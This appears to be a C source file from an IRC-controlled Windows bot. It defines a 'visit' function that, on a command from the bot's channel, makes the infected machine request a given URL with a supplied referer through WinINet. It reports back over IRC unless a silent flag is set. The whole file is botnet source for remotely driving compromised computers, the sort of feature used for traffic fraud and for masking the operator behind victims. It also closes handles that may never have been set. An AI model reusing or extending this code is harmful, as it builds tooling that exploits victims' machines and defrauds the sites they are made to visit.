#include "Includes.h"
#include "extern.h"

 #ifndef NO_VISIT
// url visit function
 DWORD WINAPI visit(LPVOID param)
 {
	URL_COMPONENTS url;
	HINTERNET ch, req;
	const char *accept = "*/*";
	char *error = "error visiting URL.";
	vs visit;
	char vhost[128];
	int vport;
	char vuser[128];
	char vpass[128];
	char vpath[256];

	visit = *((vs *)param);
	vs *vsp = (vs *)param;
	vsp->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!InternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "invalid URL.", FALSE);
				break;
			}

		// copy url parts into variables
		if (url.dwHostNameLength > 0) strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		vport = url.nPort;
		if (url.dwUserNameLength > 0) strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = InternetConnect(ih, vhost, vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		req = HttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
			break;
		}

		if (HttpSendRequest(req, NULL, 0, NULL, 0)) {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, "url visited.", FALSE);
		} else {
			if (!visit.silent) irc_privmsg(visit.sock, visit.chan, error, FALSE);
		}
	} while(0); // always false, so this never loops, only helps make error handling easier

	InternetCloseHandle(ch);
	InternetCloseHandle(req);
	return 0;
 }
 #endif